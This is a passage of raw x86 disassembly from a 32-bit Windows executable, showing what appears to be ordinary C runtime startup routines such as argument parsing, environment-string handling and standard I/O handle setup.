  40247c:	ff 45 0c             	incl   0xc(%ebp)
  40247f:	88 01                	mov    %al,(%ecx)
  402481:	eb 0d                	jmp    0x402490
  402483:	e8 03 40 00 00       	call   0x40648b
  402488:	59                   	pop    %ecx
  402489:	85 c0                	test   %eax,%eax
  40248b:	74 03                	je     0x402490
  40248d:	46                   	inc    %esi
  40248e:	ff 07                	incl   (%edi)
  402490:	ff 07                	incl   (%edi)
  402492:	8b 55 0c             	mov    0xc(%ebp),%edx
  402495:	46                   	inc    %esi
  402496:	e9 56 ff ff ff       	jmp    0x4023f1
  40249b:	85 d2                	test   %edx,%edx
  40249d:	74 07                	je     0x4024a6
  40249f:	c6 02 00             	movb   $0x0,(%edx)
  4024a2:	42                   	inc    %edx
  4024a3:	89 55 0c             	mov    %edx,0xc(%ebp)
  4024a6:	ff 07                	incl   (%edi)
  4024a8:	8b 4d 10             	mov    0x10(%ebp),%ecx
  4024ab:	e9 0e ff ff ff       	jmp    0x4023be
  4024b0:	8b 45 08             	mov    0x8(%ebp),%eax
  4024b3:	5e                   	pop    %esi
  4024b4:	5b                   	pop    %ebx
  4024b5:	85 c0                	test   %eax,%eax
  4024b7:	74 03                	je     0x4024bc
  4024b9:	83 20 00             	andl   $0x0,(%eax)
  4024bc:	ff 01                	incl   (%ecx)
  4024be:	c9                   	leave
  4024bf:	c3                   	ret
  4024c0:	8b ff                	mov    %edi,%edi
  4024c2:	55                   	push   %ebp
  4024c3:	8b ec                	mov    %esp,%ebp
  4024c5:	83 ec 0c             	sub    $0xc,%esp
  4024c8:	53                   	push   %ebx
  4024c9:	33 db                	xor    %ebx,%ebx
  4024cb:	56                   	push   %esi
  4024cc:	57                   	push   %edi
  4024cd:	39 1d cc fa 40 00    	cmp    %ebx,0x40facc
  4024d3:	75 05                	jne    0x4024da
  4024d5:	e8 ce 1f 00 00       	call   0x4044a8
  4024da:	68 04 01 00 00       	push   $0x104
  4024df:	be 60 e2 40 00       	mov    $0x40e260,%esi
  4024e4:	56                   	push   %esi
  4024e5:	53                   	push   %ebx
  4024e6:	88 1d 64 e3 40 00    	mov    %bl,0x40e364
  4024ec:	ff 15 08 a0 40 00    	call   *0x40a008
  4024f2:	a1 d8 fa 40 00       	mov    0x40fad8,%eax
  4024f7:	89 35 30 df 40 00    	mov    %esi,0x40df30
  4024fd:	3b c3                	cmp    %ebx,%eax
  4024ff:	74 07                	je     0x402508
  402501:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402504:	38 18                	cmp    %bl,(%eax)
  402506:	75 03                	jne    0x40250b
  402508:	89 75 fc             	mov    %esi,-0x4(%ebp)
  40250b:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40250e:	8d 45 f8             	lea    -0x8(%ebp),%eax
  402511:	50                   	push   %eax
  402512:	53                   	push   %ebx
  402513:	53                   	push   %ebx
  402514:	8d 7d f4             	lea    -0xc(%ebp),%edi
  402517:	e8 0a fe ff ff       	call   0x402326
  40251c:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40251f:	83 c4 0c             	add    $0xc,%esp
  402522:	3d ff ff ff 3f       	cmp    $0x3fffffff,%eax
  402527:	73 4a                	jae    0x402573
  402529:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40252c:	83 f9 ff             	cmp    $0xffffffff,%ecx
  40252f:	73 42                	jae    0x402573
  402531:	8b f8                	mov    %eax,%edi
  402533:	c1 e7 02             	shl    $0x2,%edi
  402536:	8d 04 0f             	lea    (%edi,%ecx,1),%eax
  402539:	3b c1                	cmp    %ecx,%eax
  40253b:	72 36                	jb     0x402573
  40253d:	50                   	push   %eax
  40253e:	e8 57 23 00 00       	call   0x40489a
  402543:	8b f0                	mov    %eax,%esi
  402545:	59                   	pop    %ecx
  402546:	3b f3                	cmp    %ebx,%esi
  402548:	74 29                	je     0x402573
  40254a:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40254d:	8d 45 f8             	lea    -0x8(%ebp),%eax
  402550:	50                   	push   %eax
  402551:	03 fe                	add    %esi,%edi
  402553:	57                   	push   %edi
  402554:	56                   	push   %esi
  402555:	8d 7d f4             	lea    -0xc(%ebp),%edi
  402558:	e8 c9 fd ff ff       	call   0x402326
  40255d:	8b 45 f8             	mov    -0x8(%ebp),%eax
  402560:	83 c4 0c             	add    $0xc,%esp
  402563:	48                   	dec    %eax
  402564:	a3 14 df 40 00       	mov    %eax,0x40df14
  402569:	89 35 18 df 40 00    	mov    %esi,0x40df18
  40256f:	33 c0                	xor    %eax,%eax
  402571:	eb 03                	jmp    0x402576
  402573:	83 c8 ff             	or     $0xffffffff,%eax
  402576:	5f                   	pop    %edi
  402577:	5e                   	pop    %esi
  402578:	5b                   	pop    %ebx
  402579:	c9                   	leave
  40257a:	c3                   	ret
  40257b:	8b ff                	mov    %edi,%edi
  40257d:	55                   	push   %ebp
  40257e:	8b ec                	mov    %esp,%ebp
  402580:	a1 68 e3 40 00       	mov    0x40e368,%eax
  402585:	83 ec 0c             	sub    $0xc,%esp
  402588:	53                   	push   %ebx
  402589:	56                   	push   %esi
  40258a:	8b 35 90 a0 40 00    	mov    0x40a090,%esi
  402590:	57                   	push   %edi
  402591:	33 db                	xor    %ebx,%ebx
  402593:	33 ff                	xor    %edi,%edi
  402595:	3b c3                	cmp    %ebx,%eax
  402597:	75 2e                	jne    0x4025c7
  402599:	ff d6                	call   *%esi
  40259b:	8b f8                	mov    %eax,%edi
  40259d:	3b fb                	cmp    %ebx,%edi
  40259f:	74 0c                	je     0x4025ad
  4025a1:	c7 05 68 e3 40 00 01 	movl   $0x1,0x40e368
  4025a8:	00 00 00 
  4025ab:	eb 23                	jmp    0x4025d0
  4025ad:	ff 15 8c a0 40 00    	call   *0x40a08c
  4025b3:	83 f8 78             	cmp    $0x78,%eax
  4025b6:	75 0a                	jne    0x4025c2
  4025b8:	6a 02                	push   $0x2
  4025ba:	58                   	pop    %eax
  4025bb:	a3 68 e3 40 00       	mov    %eax,0x40e368
  4025c0:	eb 05                	jmp    0x4025c7
  4025c2:	a1 68 e3 40 00       	mov    0x40e368,%eax
  4025c7:	83 f8 01             	cmp    $0x1,%eax
  4025ca:	0f 85 81 00 00 00    	jne    0x402651
  4025d0:	3b fb                	cmp    %ebx,%edi
  4025d2:	75 0f                	jne    0x4025e3
  4025d4:	ff d6                	call   *%esi
  4025d6:	8b f8                	mov    %eax,%edi
  4025d8:	3b fb                	cmp    %ebx,%edi
  4025da:	75 07                	jne    0x4025e3
  4025dc:	33 c0                	xor    %eax,%eax
  4025de:	e9 ca 00 00 00       	jmp    0x4026ad
  4025e3:	8b c7                	mov    %edi,%eax
  4025e5:	66 39 1f             	cmp    %bx,(%edi)
  4025e8:	74 0e                	je     0x4025f8
  4025ea:	40                   	inc    %eax
  4025eb:	40                   	inc    %eax
  4025ec:	66 39 18             	cmp    %bx,(%eax)
  4025ef:	75 f9                	jne    0x4025ea
  4025f1:	40                   	inc    %eax
  4025f2:	40                   	inc    %eax
  4025f3:	66 39 18             	cmp    %bx,(%eax)
  4025f6:	75 f2                	jne    0x4025ea
  4025f8:	8b 35 88 a0 40 00    	mov    0x40a088,%esi
  4025fe:	53                   	push   %ebx
  4025ff:	53                   	push   %ebx
  402600:	53                   	push   %ebx
  402601:	2b c7                	sub    %edi,%eax
  402603:	53                   	push   %ebx
  402604:	d1 f8                	sar    $1,%eax
  402606:	40                   	inc    %eax
  402607:	50                   	push   %eax
  402608:	57                   	push   %edi
  402609:	53                   	push   %ebx
  40260a:	53                   	push   %ebx
  40260b:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40260e:	ff d6                	call   *%esi
  402610:	89 45 f8             	mov    %eax,-0x8(%ebp)
  402613:	3b c3                	cmp    %ebx,%eax
  402615:	74 2f                	je     0x402646
  402617:	50                   	push   %eax
  402618:	e8 7d 22 00 00       	call   0x40489a
  40261d:	59                   	pop    %ecx
  40261e:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402621:	3b c3                	cmp    %ebx,%eax
  402623:	74 21                	je     0x402646
  402625:	53                   	push   %ebx
  402626:	53                   	push   %ebx
  402627:	ff 75 f8             	push   -0x8(%ebp)
  40262a:	50                   	push   %eax
  40262b:	ff 75 f4             	push   -0xc(%ebp)
  40262e:	57                   	push   %edi
  40262f:	53                   	push   %ebx
  402630:	53                   	push   %ebx
  402631:	ff d6                	call   *%esi
  402633:	85 c0                	test   %eax,%eax
  402635:	75 0c                	jne    0x402643
  402637:	ff 75 fc             	push   -0x4(%ebp)
  40263a:	e8 ac 21 00 00       	call   0x4047eb
  40263f:	59                   	pop    %ecx
  402640:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  402643:	8b 5d fc             	mov    -0x4(%ebp),%ebx
  402646:	57                   	push   %edi
  402647:	ff 15 84 a0 40 00    	call   *0x40a084
  40264d:	8b c3                	mov    %ebx,%eax
  40264f:	eb 5c                	jmp    0x4026ad
  402651:	83 f8 02             	cmp    $0x2,%eax
  402654:	74 04                	je     0x40265a
  402656:	3b c3                	cmp    %ebx,%eax
  402658:	75 82                	jne    0x4025dc
  40265a:	ff 15 80 a0 40 00    	call   *0x40a080
  402660:	8b f0                	mov    %eax,%esi
  402662:	3b f3                	cmp    %ebx,%esi
  402664:	0f 84 72 ff ff ff    	je     0x4025dc
  40266a:	38 1e                	cmp    %bl,(%esi)
  40266c:	74 0a                	je     0x402678
  40266e:	40                   	inc    %eax
  40266f:	38 18                	cmp    %bl,(%eax)
  402671:	75 fb                	jne    0x40266e
  402673:	40                   	inc    %eax
  402674:	38 18                	cmp    %bl,(%eax)
  402676:	75 f6                	jne    0x40266e
  402678:	2b c6                	sub    %esi,%eax
  40267a:	40                   	inc    %eax
  40267b:	50                   	push   %eax
  40267c:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40267f:	e8 16 22 00 00       	call   0x40489a
  402684:	8b f8                	mov    %eax,%edi
  402686:	59                   	pop    %ecx
  402687:	3b fb                	cmp    %ebx,%edi
  402689:	75 0c                	jne    0x402697
  40268b:	56                   	push   %esi
  40268c:	ff 15 7c a0 40 00    	call   *0x40a07c
  402692:	e9 45 ff ff ff       	jmp    0x4025dc
  402697:	ff 75 f8             	push   -0x8(%ebp)
  40269a:	56                   	push   %esi
  40269b:	57                   	push   %edi
  40269c:	e8 0f 3e 00 00       	call   0x4064b0
  4026a1:	83 c4 0c             	add    $0xc,%esp
  4026a4:	56                   	push   %esi
  4026a5:	ff 15 7c a0 40 00    	call   *0x40a07c
  4026ab:	8b c7                	mov    %edi,%eax
  4026ad:	5f                   	pop    %edi
  4026ae:	5e                   	pop    %esi
  4026af:	5b                   	pop    %ebx
  4026b0:	c9                   	leave
  4026b1:	c3                   	ret
  4026b2:	6a 54                	push   $0x54
  4026b4:	68 b8 b5 40 00       	push   $0x40b5b8
  4026b9:	e8 62 08 00 00       	call   0x402f20
  4026be:	33 ff                	xor    %edi,%edi
  4026c0:	89 7d fc             	mov    %edi,-0x4(%ebp)
  4026c3:	8d 45 9c             	lea    -0x64(%ebp),%eax
  4026c6:	50                   	push   %eax
  4026c7:	ff 15 50 a0 40 00    	call   *0x40a050
  4026cd:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  4026d4:	6a 40                	push   $0x40
  4026d6:	6a 20                	push   $0x20
  4026d8:	5e                   	pop    %esi
  4026d9:	56                   	push   %esi
  4026da:	e8 00 22 00 00       	call   0x4048df
  4026df:	59                   	pop    %ecx
  4026e0:	59                   	pop    %ecx
  4026e1:	3b c7                	cmp    %edi,%eax
  4026e3:	0f 84 14 02 00 00    	je     0x4028fd
  4026e9:	a3 c0 f9 40 00       	mov    %eax,0x40f9c0
  4026ee:	89 35 ac f9 40 00    	mov    %esi,0x40f9ac
  4026f4:	8d 88 00 08 00 00    	lea    0x800(%eax),%ecx
  4026fa:	eb 30                	jmp    0x40272c
  4026fc:	c6 40 04 00          	movb   $0x0,0x4(%eax)
  402700:	83 08 ff             	orl    $0xffffffff,(%eax)
  402703:	c6 40 05 0a          	movb   $0xa,0x5(%eax)
  402707:	89 78 08             	mov    %edi,0x8(%eax)
  40270a:	c6 40 24 00          	movb   $0x0,0x24(%eax)
  40270e:	c6 40 25 0a          	movb   $0xa,0x25(%eax)
  402712:	c6 40 26 0a          	movb   $0xa,0x26(%eax)
  402716:	89 78 38             	mov    %edi,0x38(%eax)
  402719:	c6 40 34 00          	movb   $0x0,0x34(%eax)
  40271d:	83 c0 40             	add    $0x40,%eax
  402720:	8b 0d c0 f9 40 00    	mov    0x40f9c0,%ecx
  402726:	81 c1 00 08 00 00    	add    $0x800,%ecx
  40272c:	3b c1                	cmp    %ecx,%eax
  40272e:	72 cc                	jb     0x4026fc
  402730:	66 39 7d ce          	cmp    %di,-0x32(%ebp)
  402734:	0f 84 0a 01 00 00    	je     0x402844
  40273a:	8b 45 d0             	mov    -0x30(%ebp),%eax
  40273d:	3b c7                	cmp    %edi,%eax
  40273f:	0f 84 ff 00 00 00    	je     0x402844
  402745:	8b 38                	mov    (%eax),%edi
  402747:	8d 58 04             	lea    0x4(%eax),%ebx
  40274a:	8d 04 3b             	lea    (%ebx,%edi,1),%eax
  40274d:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  402750:	be 00 08 00 00       	mov    $0x800,%esi
  402755:	3b fe                	cmp    %esi,%edi
  402757:	7c 02                	jl     0x40275b
  402759:	8b fe                	mov    %esi,%edi
  40275b:	c7 45 e0 01 00 00 00 	movl   $0x1,-0x20(%ebp)
  402762:	eb 5b                	jmp    0x4027bf
  402764:	6a 40                	push   $0x40
  402766:	6a 20                	push   $0x20
  402768:	e8 72 21 00 00       	call   0x4048df
  40276d:	59                   	pop    %ecx
  40276e:	59                   	pop    %ecx
  40276f:	85 c0                	test   %eax,%eax
  402771:	74 56                	je     0x4027c9
  402773:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  402776:	8d 0c 8d c0 f9 40 00 	lea    0x40f9c0(,%ecx,4),%ecx
  40277d:	89 01                	mov    %eax,(%ecx)
  40277f:	83 05 ac f9 40 00 20 	addl   $0x20,0x40f9ac
  402786:	8d 90 00 08 00 00    	lea    0x800(%eax),%edx
  40278c:	eb 2a                	jmp    0x4027b8
  40278e:	c6 40 04 00          	movb   $0x0,0x4(%eax)
  402792:	83 08 ff             	orl    $0xffffffff,(%eax)
  402795:	c6 40 05 0a          	movb   $0xa,0x5(%eax)
  402799:	83 60 08 00          	andl   $0x0,0x8(%eax)
  40279d:	80 60 24 80          	andb   $0x80,0x24(%eax)
  4027a1:	c6 40 25 0a          	movb   $0xa,0x25(%eax)
  4027a5:	c6 40 26 0a          	movb   $0xa,0x26(%eax)
  4027a9:	83 60 38 00          	andl   $0x0,0x38(%eax)
  4027ad:	c6 40 34 00          	movb   $0x0,0x34(%eax)
  4027b1:	83 c0 40             	add    $0x40,%eax
  4027b4:	8b 11                	mov    (%ecx),%edx
  4027b6:	03 d6                	add    %esi,%edx
  4027b8:	3b c2                	cmp    %edx,%eax
  4027ba:	72 d2                	jb     0x40278e
  4027bc:	ff 45 e0             	incl   -0x20(%ebp)
  4027bf:	39 3d ac f9 40 00    	cmp    %edi,0x40f9ac
  4027c5:	7c 9d                	jl     0x402764
  4027c7:	eb 06                	jmp    0x4027cf
  4027c9:	8b 3d ac f9 40 00    	mov    0x40f9ac,%edi
  4027cf:	83 65 e0 00          	andl   $0x0,-0x20(%ebp)
  4027d3:	85 ff                	test   %edi,%edi
  4027d5:	7e 6d                	jle    0x402844
  4027d7:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  4027da:	8b 08                	mov    (%eax),%ecx
  4027dc:	83 f9 ff             	cmp    $0xffffffff,%ecx
  4027df:	74 56                	je     0x402837
  4027e1:	83 f9 fe             	cmp    $0xfffffffe,%ecx
  4027e4:	74 51                	je     0x402837
  4027e6:	8a 03                	mov    (%ebx),%al
  4027e8:	a8 01                	test   $0x1,%al
  4027ea:	74 4b                	je     0x402837
  4027ec:	a8 08                	test   $0x8,%al
  4027ee:	75 0b                	jne    0x4027fb
  4027f0:	51                   	push   %ecx
  4027f1:	ff 15 98 a0 40 00    	call   *0x40a098
  4027f7:	85 c0                	test   %eax,%eax
  4027f9:	74 3c                	je     0x402837
  4027fb:	8b 75 e0             	mov    -0x20(%ebp),%esi
  4027fe:	8b c6                	mov    %esi,%eax
  402800:	c1 f8 05             	sar    $0x5,%eax
  402803:	83 e6 1f             	and    $0x1f,%esi
  402806:	c1 e6 06             	shl    $0x6,%esi
  402809:	03 34 85 c0 f9 40 00 	add    0x40f9c0(,%eax,4),%esi
  402810:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  402813:	8b 00                	mov    (%eax),%eax
  402815:	89 06                	mov    %eax,(%esi)
  402817:	8a 03                	mov    (%ebx),%al
  402819:	88 46 04             	mov    %al,0x4(%esi)
  40281c:	68 a0 0f 00 00       	push   $0xfa0
  402821:	8d 46 0c             	lea    0xc(%esi),%eax
  402824:	50                   	push   %eax
  402825:	e8 32 38 00 00       	call   0x40605c
  40282a:	59                   	pop    %ecx
  40282b:	59                   	pop    %ecx
  40282c:	85 c0                	test   %eax,%eax
  40282e:	0f 84 c9 00 00 00    	je     0x4028fd
  402834:	ff 46 08             	incl   0x8(%esi)
  402837:	ff 45 e0             	incl   -0x20(%ebp)
  40283a:	43                   	inc    %ebx
  40283b:	83 45 e4 04          	addl   $0x4,-0x1c(%ebp)
  40283f:	39 7d e0             	cmp    %edi,-0x20(%ebp)
  402842:	7c 93                	jl     0x4027d7
  402844:	33 db                	xor    %ebx,%ebx
  402846:	8b f3                	mov    %ebx,%esi
  402848:	c1 e6 06             	shl    $0x6,%esi
  40284b:	03 35 c0 f9 40 00    	add    0x40f9c0,%esi
  402851:	8b 06                	mov    (%esi),%eax
  402853:	83 f8 ff             	cmp    $0xffffffff,%eax
  402856:	74 0b                	je     0x402863
  402858:	83 f8 fe             	cmp    $0xfffffffe,%eax
  40285b:	74 06                	je     0x402863
  40285d:	80 4e 04 80          	orb    $0x80,0x4(%esi)
  402861:	eb 72                	jmp    0x4028d5
  402863:	c6 46 04 81          	movb   $0x81,0x4(%esi)
  402867:	85 db                	test   %ebx,%ebx
  402869:	75 05                	jne    0x402870
  40286b:	6a f6                	push   $0xfffffff6
  40286d:	58                   	pop    %eax
  40286e:	eb 0a                	jmp    0x40287a
  402870:	8b c3                	mov    %ebx,%eax
  402872:	48                   	dec    %eax
  402873:	f7 d8                	neg    %eax
  402875:	1b c0                	sbb    %eax,%eax
  402877:	83 c0 f5             	add    $0xfffffff5,%eax
  40287a:	50                   	push   %eax
  40287b:	ff 15 78 a0 40 00    	call   *0x40a078
  402881:	8b f8                	mov    %eax,%edi
  402883:	83 ff ff             	cmp    $0xffffffff,%edi
  402886:	74 43                	je     0x4028cb
  402888:	85 ff                	test   %edi,%edi
  40288a:	74 3f                	je     0x4028cb
  40288c:	57                   	push   %edi
  40288d:	ff 15 98 a0 40 00    	call   *0x40a098
  402893:	85 c0                	test   %eax,%eax
  402895:	74 34                	je     0x4028cb
  402897:	89 3e                	mov    %edi,(%esi)
  402899:	25 ff 00 00 00       	and    $0xff,%eax
  40289e:	83 f8 02             	cmp    $0x2,%eax
  4028a1:	75 06                	jne    0x4028a9
  4028a3:	80 4e 04 40          	orb    $0x40,0x4(%esi)
  4028a7:	eb 09                	jmp    0x4028b2
  4028a9:	83 f8 03             	cmp    $0x3,%eax
  4028ac:	75 04                	jne    0x4028b2
  4028ae:	80 4e 04 08          	orb    $0x8,0x4(%esi)
  4028b2:	68 a0 0f 00 00       	push   $0xfa0
  4028b7:	8d 46 0c             	lea    0xc(%esi),%eax
  4028ba:	50                   	push   %eax
  4028bb:	e8 9c 37 00 00       	call   0x40605c
  4028c0:	59                   	pop    %ecx
  4028c1:	59                   	pop    %ecx
  4028c2:	85 c0                	test   %eax,%eax
  4028c4:	74 37                	je     0x4028fd
  4028c6:	ff 46 08             	incl   0x8(%esi)
  4028c9:	eb 0a                	jmp    0x4028d5
  4028cb:	80 4e 04 40          	orb    $0x40,0x4(%esi)
  4028cf:	c7 06 fe ff ff ff    	movl   $0xfffffffe,(%esi)
  4028d5:	43                   	inc    %ebx
  4028d6:	83 fb 03             	cmp    $0x3,%ebx
  4028d9:	0f 8c 67 ff ff ff    	jl     0x402846
  4028df:	ff 35 ac f9 40 00    	push   0x40f9ac
  4028e5:	ff 15 94 a0 40 00    	call   *0x40a094
  4028eb:	33 c0                	xor    %eax,%eax
  4028ed:	eb 11                	jmp    0x402900
  4028ef:	33 c0                	xor    %eax,%eax
  4028f1:	40                   	inc    %eax
  4028f2:	c3                   	ret
  4028f3:	8b 65 e8             	mov    -0x18(%ebp),%esp
  4028f6:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  4028fd:	83 c8 ff             	or     $0xffffffff,%eax
  402900:	e8 60 06 00 00       	call   0x402f65
  402905:	c3                   	ret
  402906:	8b ff                	mov    %edi,%edi
  402908:	56                   	push   %esi
  402909:	b8 60 b5 40 00       	mov    $0x40b560,%eax
  40290e:	be 60 b5 40 00       	mov    $0x40b560,%esi
  402913:	57                   	push   %edi
  402914:	8b f8                	mov    %eax,%edi
  402916:	3b c6                	cmp    %esi,%eax
  402918:	73 0f                	jae    0x402929
  40291a:	8b 07                	mov    (%edi),%eax
  40291c:	85 c0                	test   %eax,%eax
  40291e:	74 02                	je     0x402922
  402920:	ff d0                	call   *%eax
  402922:	83 c7 04             	add    $0x4,%edi
  402925:	3b fe                	cmp    %esi,%edi
  402927:	72 f1                	jb     0x40291a
  402929:	5f                   	pop    %edi
  40292a:	5e                   	pop    %esi
  40292b:	c3                   	ret
  40292c:	8b ff                	mov    %edi,%edi
  40292e:	56                   	push   %esi
  40292f:	b8 68 b5 40 00       	mov    $0x40b568,%eax
  402934:	be 68 b5 40 00       	mov    $0x40b568,%esi
  402939:	57                   	push   %edi
  40293a:	8b f8                	mov    %eax,%edi
  40293c:	3b c6                	cmp    %esi,%eax
  40293e:	73 0f                	jae    0x40294f
  402940:	8b 07                	mov    (%edi),%eax
  402942:	85 c0                	test   %eax,%eax
  402944:	74 02                	je     0x402948
  402946:	ff d0                	call   *%eax
  402948:	83 c7 04             	add    $0x4,%edi
  40294b:	3b fe                	cmp    %esi,%edi
  40294d:	72 f1                	jb     0x402940
  40294f:	5f                   	pop    %edi
  402950:	5e                   	pop    %esi
  402951:	c3                   	ret
  402952:	8b ff                	mov    %edi,%edi
  402954:	55                   	push   %ebp
  402955:	8b ec                	mov    %esp,%ebp
  402957:	56                   	push   %esi
  402958:	ff 35 94 d2 40 00    	push   0x40d294
  40295e:	8b 35 a0 a0 40 00    	mov    0x40a0a0,%esi
  402964:	ff d6                	call   *%esi
  402966:	85 c0                	test   %eax,%eax
  402968:	74 21                	je     0x40298b
  40296a:	a1 90 d2 40 00       	mov    0x40d290,%eax
  40296f:	83 f8 ff             	cmp    $0xffffffff,%eax
  402972:	74 17                	je     0x40298b
  402974:	50                   	push   %eax
  402975:	ff 35 94 d2 40 00    	push   0x40d294
  40297b:	ff d6                	call   *%esi
  40297d:	ff d0                	call   *%eax
  40297f:	85 c0                	test   %eax,%eax
  402981:	74 08                	je     0x40298b
  402983:	8b 80 f8 01 00 00    	mov    0x1f8(%eax),%eax
  402989:	eb 27                	jmp    0x4029b2
  40298b:	be 84 a8 40 00       	mov    $0x40a884,%esi
  402990:	56                   	push   %esi
  402991:	ff 15 68 a0 40 00    	call   *0x40a068
  402997:	85 c0                	test   %eax,%eax
  402999:	75 0b                	jne    0x4029a6
  40299b:	56                   	push   %esi
  40299c:	e8 cb f1 ff ff       	call   0x401b6c
  4029a1:	59                   	pop    %ecx
  4029a2:	85 c0                	test   %eax,%eax
  4029a4:	74 18                	je     0x4029be
  4029a6:	68 74 a8 40 00       	push   $0x40a874
  4029ab:	50                   	push   %eax
  4029ac:	ff 15 70 a0 40 00    	call   *0x40a070
  4029b2:	85 c0                	test   %eax,%eax
  4029b4:	74 08                	je     0x4029be
  4029b6:	ff 75 08             	push   0x8(%ebp)
  4029b9:	ff d0                	call   *%eax
  4029bb:	89 45 08             	mov    %eax,0x8(%ebp)
  4029be:	8b 45 08             	mov    0x8(%ebp),%eax
  4029c1:	5e                   	pop    %esi
  4029c2:	5d                   	pop    %ebp
  4029c3:	c3                   	ret
  4029c4:	6a 00                	push   $0x0
  4029c6:	e8 87 ff ff ff       	call   0x402952
  4029cb:	59                   	pop    %ecx
  4029cc:	c3                   	ret
  4029cd:	8b ff                	mov    %edi,%edi
  4029cf:	55                   	push   %ebp
  4029d0:	8b ec                	mov    %esp,%ebp
  4029d2:	56                   	push   %esi
  4029d3:	ff 35 94 d2 40 00    	push   0x40d294
  4029d9:	8b 35 a0 a0 40 00    	mov    0x40a0a0,%esi
  4029df:	ff d6                	call   *%esi
  4029e1:	85 c0                	test   %eax,%eax
  4029e3:	74 21                	je     0x402a06
  4029e5:	a1 90 d2 40 00       	mov    0x40d290,%eax
  4029ea:	83 f8 ff             	cmp    $0xffffffff,%eax
  4029ed:	74 17                	je     0x402a06
  4029ef:	50                   	push   %eax
  4029f0:	ff 35 94 d2 40 00    	push   0x40d294
  4029f6:	ff d6                	call   *%esi
  4029f8:	ff d0                	call   *%eax
  4029fa:	85 c0                	test   %eax,%eax
  4029fc:	74 08                	je     0x402a06
  4029fe:	8b 80 fc 01 00 00    	mov    0x1fc(%eax),%eax
  402a04:	eb 27                	jmp    0x402a2d
  402a06:	be 84 a8 40 00       	mov    $0x40a884,%esi
  402a0b:	56                   	push   %esi
  402a0c:	ff 15 68 a0 40 00    	call   *0x40a068
  402a12:	85 c0                	test   %eax,%eax
  402a14:	75 0b                	jne    0x402a21
  402a16:	56                   	push   %esi
  402a17:	e8 50 f1 ff ff       	call   0x401b6c
  402a1c:	59                   	pop    %ecx
  402a1d:	85 c0                	test   %eax,%eax
  402a1f:	74 18                	je     0x402a39
  402a21:	68 a0 a8 40 00       	push   $0x40a8a0
  402a26:	50                   	push   %eax
  402a27:	ff 15 70 a0 40 00    	call   *0x40a070
  402a2d:	85 c0                	test   %eax,%eax
  402a2f:	74 08                	je     0x402a39
  402a31:	ff 75 08             	push   0x8(%ebp)
  402a34:	ff d0                	call   *%eax
  402a36:	89 45 08             	mov    %eax,0x8(%ebp)
  402a39:	8b 45 08             	mov    0x8(%ebp),%eax
  402a3c:	5e                   	pop    %esi
  402a3d:	5d                   	pop    %ebp
  402a3e:	c3                   	ret
  402a3f:	ff 15 a4 a0 40 00    	call   *0x40a0a4
  402a45:	c2 04 00             	ret    $0x4
  402a48:	8b ff                	mov    %edi,%edi
  402a4a:	56                   	push   %esi
  402a4b:	ff 35 94 d2 40 00    	push   0x40d294
  402a51:	ff 15 a0 a0 40 00    	call   *0x40a0a0
  402a57:	8b f0                	mov    %eax,%esi
  402a59:	85 f6                	test   %esi,%esi
  402a5b:	75 1b                	jne    0x402a78
  402a5d:	ff 35 70 e3 40 00    	push   0x40e370
  402a63:	e8 65 ff ff ff       	call   0x4029cd
  402a68:	59                   	pop    %ecx
  402a69:	8b f0                	mov    %eax,%esi
  402a6b:	56                   	push   %esi
  402a6c:	ff 35 94 d2 40 00    	push   0x40d294
  402a72:	ff 15 a8 a0 40 00    	call   *0x40a0a8
  402a78:	8b c6                	mov    %esi,%eax
  402a7a:	5e                   	pop    %esi
  402a7b:	c3                   	ret
  402a7c:	a1 90 d2 40 00       	mov    0x40d290,%eax
  402a81:	83 f8 ff             	cmp    $0xffffffff,%eax
  402a84:	74 16                	je     0x402a9c
  402a86:	50                   	push   %eax
  402a87:	ff 35 78 e3 40 00    	push   0x40e378
  402a8d:	e8 3b ff ff ff       	call   0x4029cd
  402a92:	59                   	pop    %ecx
  402a93:	ff d0                	call   *%eax
  402a95:	83 0d 90 d2 40 00 ff 	orl    $0xffffffff,0x40d290
  402a9c:	a1 94 d2 40 00       	mov    0x40d294,%eax
  402aa1:	83 f8 ff             	cmp    $0xffffffff,%eax
  402aa4:	74 0e                	je     0x402ab4
  402aa6:	50                   	push   %eax
  402aa7:	ff 15 ac a0 40 00    	call   *0x40a0ac
  402aad:	83 0d 94 d2 40 00 ff 	orl    $0xffffffff,0x40d294
  402ab4:	e9 6c 2f 00 00       	jmp    0x405a25
  402ab9:	6a 0c                	push   $0xc
  402abb:	68 d8 b5 40 00       	push   $0x40b5d8
  402ac0:	e8 5b 04 00 00       	call   0x402f20
  402ac5:	be 84 a8 40 00       	mov    $0x40a884,%esi
  402aca:	56                   	push   %esi
  402acb:	ff 15 68 a0 40 00    	call   *0x40a068
  402ad1:	85 c0                	test   %eax,%eax
  402ad3:	75 07                	jne    0x402adc
  402ad5:	56                   	push   %esi
  402ad6:	e8 91 f0 ff ff       	call   0x401b6c
  402adb:	59                   	pop    %ecx
  402adc:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  402adf:	8b 75 08             	mov    0x8(%ebp),%esi
  402ae2:	c7 46 5c f8 a7 40 00 	movl   $0x40a7f8,0x5c(%esi)
  402ae9:	33 ff                	xor    %edi,%edi
  402aeb:	47                   	inc    %edi
  402aec:	89 7e 14             	mov    %edi,0x14(%esi)
  402aef:	85 c0                	test   %eax,%eax
  402af1:	74 24                	je     0x402b17
  402af3:	68 74 a8 40 00       	push   $0x40a874
  402af8:	50                   	push   %eax
  402af9:	8b 1d 70 a0 40 00    	mov    0x40a070,%ebx
  402aff:	ff d3                	call   *%ebx
  402b01:	89 86 f8 01 00 00    	mov    %eax,0x1f8(%esi)
  402b07:	68 a0 a8 40 00       	push   $0x40a8a0
  402b0c:	ff 75 e4             	push   -0x1c(%ebp)
  402b0f:	ff d3                	call   *%ebx
